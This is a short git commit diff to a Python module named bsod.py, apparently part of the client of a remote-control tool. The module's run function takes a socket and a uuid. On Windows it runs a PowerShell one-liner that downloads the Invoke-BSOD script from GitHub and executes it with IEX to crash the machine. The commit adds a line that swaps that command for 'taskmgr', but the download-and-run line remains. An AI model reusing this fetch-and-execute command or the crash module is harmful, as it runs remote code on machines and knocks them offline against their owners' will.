6273d7507bfdd06b42361ca995492cf0a17d9a93
Obvious Plays <111094267+ObviousTeam@users.noreply.github.com>
2024-09-21 07:59:03 -0400

    taskmgr

--- templates/client/pem/bsod.py
+++ templates/client/pem/bsod.py
@@ -4,4 +4,5 @@ import os
 def run(sio, uuid):
     if os.name == "nt":
         powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
+        powershell_command = 'taskmgr'
         result = subprocess.Popen(powershell_command)
